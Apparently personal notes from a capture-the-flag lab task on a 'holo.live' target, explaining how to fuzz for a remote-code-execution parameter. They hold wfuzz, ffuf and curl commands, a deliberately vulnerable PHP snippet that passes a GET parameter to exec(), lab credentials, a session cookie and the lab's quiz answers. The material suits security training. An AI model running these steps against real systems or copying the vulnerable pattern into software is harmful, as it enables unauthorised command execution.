Now that you have access to the administrator subdomain, you can fuzz for remote code execution and attempt to identify a specific parameter that you can exploit to gain arbitrary access to the machine.  

Remote code execution, also known as arbitrary code execution, allows you to execute commands or code on a remote system. RCE can often exploit this by controlling a parameter utilized by a web server.  

One method of attempting to identify RCE is by fuzzing for a vulnerable parameter using Wfuzz. Similar to how we used Wfuzz for asset discovery. The syntax is the same as previous commands; however, this time we will replace the `FUZZ` command at the end along with a `?` so that the complete `FUZZ` parameter is `?FUZZ=ls+-la` Find an example below from the test environment.

Syntax: `wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2`

We suggest using the Seclists "big.txt" for fuzzing RCE parameters.  

Now that we know we can control the parameter, we can attempt to gain RCE on the box. Find an example below from the test environment.  

Command used: `curl -vvv http://localhost:8080/test.php?cmd=ls+-la && echo ""`

Rather than fuzzing all the pages that we find to identify RCE, we can utilize code analysis to look at the code running on a page and infer whether or not the code may be vulnerable. Find an example below of how code can run a command and is vulnerable to an attacker controlling the parameter.  

```
<?php    
	$id = $_GET["cmd"];   
	if ($_GET["cmd"] == NULL){   
		echo "Hello " . exec("whoami") . "!";   
	} else {
	   echo "Hello " . exec($id);   
    }   
?>
```

To identify RCE, you can decide whether you want to fuzz parameters of files or you want to review the source code of a file. Your approach may also differ depending on the scenario you are in and what resources or footholds you have at your disposal.

Once you have RCE on the system, you can use a reverse shell such as netcat to gain a shell on the box. Refer to the following cheat sheet for help with reverse shells. [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).


---

# Your job

## Log in

- Navigate to http://admin.holo.live/.

	![[Task 13 - Remote Control Empanadas-20240905142323219.webp]]
- Log in with the credentials `admin:DBManagerLogin!`.

	![[Task 13 - Remote Control Empanadas-20240905142604534.webp]]

## Fuzzing

- Use the PHPSESSID cookie that you got after logging in. You can find it using the "Web Develop Tools" from your browser.

	![[Task 13 - Remote Control Empanadas-20240905145623574.webp]]
	The value is `4bat94d2s93tepg4lkgrtjdqkn`.

- Run the following command to fuzz the parameter.

	`ffuf -b PHPSESSID=4bat94d2s93tepg4lkgrtjdqkn -u http://admin.holo.live/dashboard.php\?FUZZ\=pwd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -fs 1586`

	![[Task 13 - Remote Control Empanadas-20240905150032028.webp]]
	The parameter is `cmd`.

- Navigate to http://admin.holo.live/dashboard.php/?cmd=whoami.

	![[Task 13 - Remote Control Empanadas-20240905150748521.webp]]
	The parameter with the command has worked. The user is www-data.


---
## Answer the questions below

> [!question]
> What file is vulnerable to RCE on the administrator domain?
> `dashboard.php`
> What parameter is vulnerable to RCE on the administrator domain?
> `cmd`
> What user is the web server running as?
> `www-data`

**Next step:** [[Task 14 - Meterpreter session 1 closed. Reason RUH ROH]]
